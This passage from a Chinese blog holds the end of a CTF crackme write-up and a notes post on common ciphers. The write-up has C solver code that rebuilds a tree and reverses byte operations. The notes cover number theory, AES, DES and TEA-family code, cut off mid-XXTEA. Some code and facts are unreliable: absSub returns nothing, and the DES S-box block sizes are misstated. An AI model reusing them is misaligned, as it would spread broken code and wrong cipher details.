 v1[<span class="number">5</span>]-&gt;right = v1[<span class="number">10</span>];</span><br><span class="line">  v1[<span class="number">5</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">6</span>]-&gt;right = v1[<span class="number">11</span>];</span><br><span class="line">  v1[<span class="number">6</span>]-&gt;left = v1[<span class="number">12</span>];</span><br><span class="line">  v1[<span class="number">7</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">7</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">8</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">8</span>]-&gt;left = v1[<span class="number">13</span>];</span><br><span class="line">  v1[<span class="number">9</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">9</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">10</span>]-&gt;right = v1[<span class="number">14</span>];</span><br><span class="line">  v1[<span class="number">10</span>]-&gt;left = v2;</span><br><span class="line">  v1[<span class="number">12</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">12</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">11</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">11</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">13</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">13</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v2-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v2-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">14</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">14</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  *treeHead = v1[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postTraverse</span><span class="params">(TreeNode*head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head)&#123;</span><br><span class="line">        postTraverse(head-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(head)&#123;</span><br><span class="line">        postTraverse(head-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(head)<span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>,head-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diyBit</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint32_t</span> a1,<span class="keyword">uint32_t</span> a2)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;=a2;i++)&#123;</span><br><span class="line">        data[i]^=a1;</span><br><span class="line">        data[i]=data[i]&lt;&lt;(<span class="number">8</span>-a2)|data[i]&gt;&gt;a2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">1</span>;j&lt;<span class="number">15</span>;j++)&#123;</span><br><span class="line">            data[i]^=data[j]&amp;<span class="number">0xDF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reDiyBit</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint32_t</span> a1,<span class="keyword">uint32_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i=a2;i&lt;a2+<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">1</span>;j&lt;<span class="number">15</span>;j++)&#123;</span><br><span class="line">                data[i]^=data[j]&amp;<span class="number">0xdf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            data[i]^=<span class="number">1</span>&lt;&lt;i%<span class="number">8</span>;</span><br><span class="line">            data[i]=data[i]&gt;&gt;(<span class="number">8</span>-a2%<span class="number">8</span>)|data[i]&lt;&lt;a2%<span class="number">8</span>;</span><br><span class="line">            data[i]^=a1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">sub</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a1-a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">xor</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a1^a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">absSub</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a1&gt;a2)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_4016F0</span><span class="params">(<span class="keyword">uint8_t</span> *data)</span></span>&#123;</span><br><span class="line">    data[<span class="number">15</span>] = sub(data[<span class="number">15</span>],<span class="number">2</span>);</span><br><span class="line">    data[<span class="number">14</span>] = <span class="keyword">xor</span>(data[<span class="number">14</span>],data[<span class="number">15</span>]);</span><br><span class="line">    data[<span class="number">12</span>] = absSub(data[<span class="number">12</span>],data[<span class="number">2</span>]);</span><br><span class="line">    data[<span class="number">11</span>] = <span class="keyword">xor</span>(data[<span class="number">11</span>],data[<span class="number">12</span>]);</span><br><span class="line">    data[<span class="number">10</span>]=absSub(data[<span class="number">10</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">9</span>] = absSub(data[<span class="number">9</span>],data[<span class="number">8</span>]);</span><br><span class="line">    data[<span class="number">8</span>] = <span class="keyword">xor</span>(data[<span class="number">8</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">7</span>] = sub(data[<span class="number">7</span>],<span class="number">3</span>);</span><br><span class="line">    data[<span class="number">6</span>] = absSub(data[<span class="number">6</span>],data[<span class="number">1</span>]);</span><br><span class="line">    data[<span class="number">4</span>] = <span class="keyword">xor</span>(data[<span class="number">4</span>],data[<span class="number">5</span>]);</span><br><span class="line">    data[<span class="number">3</span>] = absSub(data[<span class="number">3</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">2</span>] = sub(data[<span class="number">2</span>],<span class="number">7</span>);</span><br><span class="line">    data[<span class="number">1</span>] = <span class="keyword">xor</span>(data[<span class="number">1</span>],data[<span class="number">2</span>]);</span><br><span class="line">    data[<span class="number">0</span>] = sub(data[<span class="number">0</span>],<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// TreeNode*head;</span></span><br><span class="line">    <span class="comment">// sub_401120(&amp;head);</span></span><br><span class="line">    <span class="comment">// postTraverse(head);</span></span><br><span class="line">    <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    <span class="keyword">uint8_t</span> xorData[] = &#123;<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0x47</span>,<span class="number">0x50</span>,<span class="number">0x4f</span>,<span class="number">0x4b</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x4a</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,xorData);</span><br><span class="line">    <span class="keyword">uint8_t</span> cmpData[] = &#123;<span class="number">0x17</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0x3</span>, <span class="number">0x52</span>, <span class="number">0x2e</span>, <span class="number">0x4a</span>, <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x1b</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x3a</span>, <span class="number">0xa</span>, <span class="number">0x6c</span>, <span class="number">0x62</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;;</span><br><span class="line">    cmpData[<span class="number">0</span>]-=<span class="number">10</span>;</span><br><span class="line">    cmpData[<span class="number">12</span>]=cmpData[<span class="number">2</span>]-cmpData[<span class="number">12</span>];</span><br><span class="line">    cmpData[<span class="number">11</span>]^=cmpData[<span class="number">12</span>];</span><br><span class="line">    cmpData[<span class="number">2</span>]-=<span class="number">7</span>;</span><br><span class="line">    cmpData[<span class="number">9</span>]=cmpData[<span class="number">8</span>]-cmpData[<span class="number">9</span>];</span><br><span class="line">    cmpData[<span class="number">8</span>]^=cmpData[<span class="number">7</span>];</span><br><span class="line">    cmpData[<span class="number">10</span>]=cmpData[<span class="number">7</span>]-cmpData[<span class="number">10</span>];</span><br><span class="line">    cmpData[<span class="number">7</span>]-=<span class="number">3</span>;</span><br><span class="line">    cmpData[<span class="number">3</span>]=cmpData[<span class="number">7</span>]-cmpData[<span class="number">3</span>];<span class="comment">//test</span></span><br><span class="line">    cmpData[<span class="number">15</span>]-=<span class="number">2</span>;</span><br><span class="line">    cmpData[<span class="number">14</span>]^=cmpData[<span class="number">15</span>];</span><br><span class="line">    cmpData[<span class="number">4</span>]^=cmpData[<span class="number">5</span>];</span><br><span class="line">    cmpData[<span class="number">6</span>]=cmpData[<span class="number">1</span>]-cmpData[<span class="number">6</span>];</span><br><span class="line">    cmpData[<span class="number">1</span>]^=cmpData[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        cmpData[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,cmpData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> s[] = <span class="string">&quot;1234567890123456&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        s[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;test&quot;</span>,s,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/22/writeup/buuoj/wp/">
    <time datetime="2020-10-22T02:07:17.000Z" class="entry-date">
        2020-10-22
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/rev/usual_cipher" class="post-note/rev/usual_cipher post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/21/note/rev/usual_cipher/">常见加密算法</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/21/note/rev/usual_cipher/" data-id="ckgkfi3ue0000f4wb1eit4iit" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="相关数论基础"><a href="#相关数论基础" class="headerlink" title="相关数论基础"></a>相关数论基础</h2><h3 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h3><p>用于计算两个数的最大公约数，也叫欧几里得法</p>
<p>$gcd(a,b)=gcd(b,a\ mod\ b),a,b\in Z$</p>
<p>直到</p>
<p>$a\%b=0$</p>
<p>此时$b$就是最大公约数</p>
<p>证明过程待后续</p>
<p>代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int32_t</span> a,<span class="keyword">int32_t</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> t;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        t=a%b;</span><br><span class="line">        a=b;</span><br><span class="line">        b=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>用于快速计算$a^n,n\in N,a\in Z$</p>
<script type="math/tex; mode=display">
a^n=\begin{cases}
a^{n-1}\cdot a,n\ is\ odd
\\a^{\frac{n}{2}}\cdot a^{\frac{n}{2}},n\ is\ even
\end{cases}</script><p>代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int32_t</span> a,<span class="keyword">uint32_t</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans*=a;</span><br><span class="line">        &#125;</span><br><span class="line">        a*=a;</span><br><span class="line">        n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>给出以下的一元线性同余方程组</p>
<script type="math/tex; mode=display">
S:\begin{cases}
x\equiv a_1(mod\ m_1)\\
x\equiv a_2(mod\ m_2)\\
\ \ \ \ \vdots\\
x\equiv a_n(mod\ m_n)
\end{cases}</script><p>中国剩余定理给出了有解的判定条件和解的具体形式</p>
<p>若$m_1,m_2,…,m_n$中任两数互质，则对任意整数$a_1,a_2,…,a_n$，方程组$S$有解，通解通过如下方式得到</p>
<ol>
<li><p>$M\prod\limits_{i=1}^{n}m_i,M_i=M/m_i,\forall i\in{1,2,…,n}$</p>
</li>
<li><p>$t_i=M_i^{-1}(mod\ m_i)$</p>
</li>
<li><p>$x\equiv \sum\limits_{i=1}^{n}a_it_iM_i(mod\ M)$</p>
</li>
</ol>
<h4 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h4><p>由假设，$gcd(M_i,m_i)=1$，则$M_i^{-1}(mod\ m_i)$存在。</p>
<p>考察$x\ mod\ m_i,\because\forall j\ne i,M_j\equiv 0(mod\ m_i)$，从而得到$x\equiv a_it_iM_i(mod\ m_i)$</p>
<p>而$t_iM_i\equiv1(mod\ m_i)$，从而$x\equiv a_i(mod\ m_i)$</p>
<p>唯一性：</p>
<p>设$x_1,x_2$都是$S$的解，则$\forall i\in{1,2,…,n},x_1-x_2\equiv 0(mod\ m_i)$</p>
<p>而$gcd(m_i,m_j)=1,i\ne j,i,j\in{1,2,…,n}$，从而由$x_1-x_2\equiv0(mod\ M)$，从而说明是$x_1=x_2$</p>
<h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>$a^{p-1}\equiv 1(mod\ p),p$是质数且$a\ne0(mod\ p)$</p>
<h2 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h2><h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><h3 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h3><p>设$c_i,p_i,iv,f$分别为第$i$个密文块，明文块，初始向量，加密函数。ECB模式无$iv$。</p>
<h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><p>每个块自行加密</p>
<p>$c_0=f(p_0),c_1=f(p_1),…,c_n=f(p_n)$</p>
<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><p>当前块加密会影响到以后的块</p>
<p>$c<em>0=f(iv\oplus p_0),c_1=f(p_1\oplus c_0),…,c_n=f(c</em>{n-1}\oplus p_n)$</p>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>也叫Rijndael加密法</p>
<p>使用代换-置换网络</p>
<p>加密的单位为4*4字节共4步</p>
<ol>
<li><p>AddRountKey</p>
<p>每一回合与该次密钥做xor运算，密钥通过Rijndael密钥生成方案产生</p>
</li>
<li><p>SubBytes</p>
<p>把每一个字节通过查找表(s盒)的方式替换成另一个</p>
</li>
<li><p>ShiftRows</p>
<p>可以理解为每个双字单位分散到其它双字</p>
<p>这里是不同双字的混合</p>
</li>
<li><p>MixColumns</p>
<p>使用线性变换在一个双字内部混合</p>
<p>这里是一个双字内部的混合</p>
</li>
</ol>
<ul>
<li><p>第一轮加密之前需要进行“白化操作”，即首先异或密钥</p>
</li>
<li><p>最后一轮没有MixColumns操作，使用AddRountKey替代</p>
</li>
</ul>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>S盒</p>
<p>参考资料：<a href="[高级加密标准 - 维基百科，自由的百科全书](https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">AES—wikipedia</a>)</p>
<h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>Fiestel网络</p>
<p>16个相同的过程，块长度为64位，分成两个32位的半块v1,v2</p>
<h4 id="总体过程："><a href="#总体过程：" class="headerlink" title="总体过程："></a>总体过程：</h4><ol>
<li><p>进行一次置换，称为IP</p>
</li>
<li><p>进行16轮如下操作</p>
<p>s1=v1^F(v2)</p>
<p>v1=v2</p>
<p>v2=s1</p>
<p>其中F为Fiestel函数，包含扩张，与密钥混合，S盒，置换操作</p>
</li>
<li><p>进行一次置换，成为FP，FP为IP的逆函数</p>
</li>
</ol>
<p>IP和FP是简化输入输出数据库的过程而被显式地包含在标准中</p>
<h4 id="Fiestel函数"><a href="#Fiestel函数" class="headerlink" title="Fiestel函数"></a>Fiestel函数</h4><ol>
<li><p>扩张</p>
<p>将32为半块扩展到48位，包含8个6位块，每块包含4位输出位，加上邻接块中紧邻的位</p>
</li>
<li><p>与密钥混合</p>
<p>用异或操作将扩张结果和子密钥混合，子密钥是通过密钥调度产生的</p>
</li>
<li><p>S盒</p>
<p>与子密钥混合后，分成6个8位的块，然后使用S盒置换处理</p>
</li>
<li><p>置换</p>
<p>32个输出位利用P置换进行重组</p>
</li>
</ol>
<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>S盒</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96">DES—wikipedia</a></p>
<h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p>可以加密两个无符号整数</p>
<p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也有部分变种，大多是变了delta，或者delta使用v0=(0-(-delta))</p>
<h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相比tea，在使用密钥更不确定，特征值不变</p>
<h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4) ^ (sum^y) + (k[p&amp;3^e]^z))</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">long</span> <span class="title">btea</span><span class="params">(<span class="keyword">long</span>* v, <span class="keyword">long</span> n, <span class="keyword">long</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">long</span> p, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++) y = v[p+<span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">        y = 